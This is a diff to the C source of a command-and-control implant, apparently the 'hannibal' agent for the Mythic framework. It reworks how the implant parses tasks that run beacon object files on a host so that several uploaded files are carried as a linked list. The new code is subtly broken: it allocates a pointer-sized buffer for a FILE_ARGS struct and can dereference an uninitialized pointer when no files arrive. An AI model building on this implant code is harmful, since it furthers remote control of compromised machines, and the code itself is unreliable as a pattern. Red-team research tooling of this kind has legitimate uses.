@@ -547,11 +547,14 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
         UINT32 param1_uint32 = 0;
         UINT32 param2_uint32 = 0;
         UINT32 param3_uint32 = 0; 
-    
-
+        
         LPVOID param1_lpvoid;
         LPVOID param2_lpvoid;
         LPVOID param3_lpvoid;   
+        LPVOID temp1_lpvoid;
+        LPVOID temp2_lpvoid;
+        UINT32 temp1_uint32;
+        UINT32 params_array[255];
 
 #ifdef INCLUDE_CMD_LS
         CMD_LS *ls;
@@ -566,6 +569,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
 #endif
 #ifdef INCLUDE_CMD_EXECUTE_BOF
         CMD_EXECUTE_BOF *bof;
+        FILE_ARGS *file_args;
 #endif
 #ifdef INCLUDE_CMD_RM
         CMD_RM *rm;
@@ -1153,6 +1157,7 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             break;
 #endif // INCLUDE_CMD_EXECUTE
 #ifdef INCLUDE_CMD_EXECUTE_BOF
+        // todo: change to upload multiple
         case CMD_EXECUTE_BOF_MESSAGE:
             tlv_type = ReadUint8(&buffer);
 
@@ -1176,15 +1181,38 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             }
 
             tlv_type = ReadUint8(&buffer);
+            // param3_lpvoid = (PFILE_ARGS *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(PFILE_ARGS), MEM_COMMIT, PAGE_READWRITE);
+            
+            if (tlv_type == TLV_CMD_EXECUTE_BOF_START_FILE) { 
+                // bof->file_args;
+                file_args = (PFILE_ARGS)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(PFILE_ARGS), MEM_COMMIT, PAGE_READWRITE);
+                
+                file_args->number_of_files = ReadUint32(&buffer);
+                
+                for (temp1_uint32 = 0; temp1_uint32 < file_args->number_of_files; temp1_uint32++) {
+                    tlv_type = ReadUint8(&buffer);
+                    if (tlv_type == TLV_CMD_EXECUTE_BOF_NEXT_FILE) {
+                        // temp1_lpvoid is the head of the linked list.
+                        // temp2_lpvoid is the new file content struct.
 
-            if (tlv_type == TLV_CMD_EXECUTE_BOF_FILE) { 
-                param3_uint32 = ReadUint32(&buffer);
-                if (param3_uint32 > 0) {
-                    param3_lpvoid = ReadBytes(&buffer, param3_uint32); // Escape from the null byte in the end. Not sure if it is needed. 
+                        // allocate new FILE_CONTENT struct
+                        temp2_lpvoid = (PFILE_CONTENT *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(FILE_CONTENT), MEM_COMMIT, PAGE_READWRITE);
+
+                        if (temp1_uint32 == 0) {
+                            // this is the first file.
+                            file_args->file_content = temp2_lpvoid;                
+                        } else {
+                            // else, set the next file content struct to the current head.
+                            ((PFILE_CONTENT)temp1_lpvoid)->next_file = temp2_lpvoid;
+                        } 
+                        // update the head to be the new file content struct.
+                        temp1_lpvoid = temp2_lpvoid;
+                        ((PFILE_CONTENT)temp1_lpvoid)->file_size = ReadUint32(&buffer);  
+                        ((PFILE_CONTENT)temp1_lpvoid)->file_content = ReadBytes(&buffer, ((PFILE_CONTENT)temp1_lpvoid)->file_size); 
+                    }
                 }
-                else {
-                    param3_lpvoid = NULL;
-                }   
+                // set the last file content struct to NULL.
+                ((PFILE_CONTENT)temp1_lpvoid)->next_file = NULL;
             }
 
             task.cmd_id = CMD_EXECUTE_BOF_MESSAGE;
@@ -1198,11 +1226,8 @@ SECTION_CODE void deserialize_get_tasks_response(char *buffer)
             bof->argc = param1_uint32;
             bof->bof = param2_lpvoid;
             bof->bof_size = param2_uint32;
-            bof->file_content = param3_lpvoid;
-            bof->file_size = param3_uint32;
-            
+            bof->file_args = file_args;            
             task_enqueue(hannibal_instance_ptr->tasks.tasks_queue, &task);
-            
             break;
 #endif // INCLUDE_CMD_EXECUTE_BOF
 #ifdef INCLUDE_CMD_SLEEP
@@ -1625,6 +1650,10 @@ SECTION_CODE void mythic_http_post_tasks()
         mythic_http_continue_file_uploads();
     }
 #endif
+
+#ifdef INCLUDE_CMD_EXECUTE_BOF
+
+#endif 
 
     for (int i = hannibal_instance_ptr->tasks.tasks_response_queue->size; i > 0; i--){
 
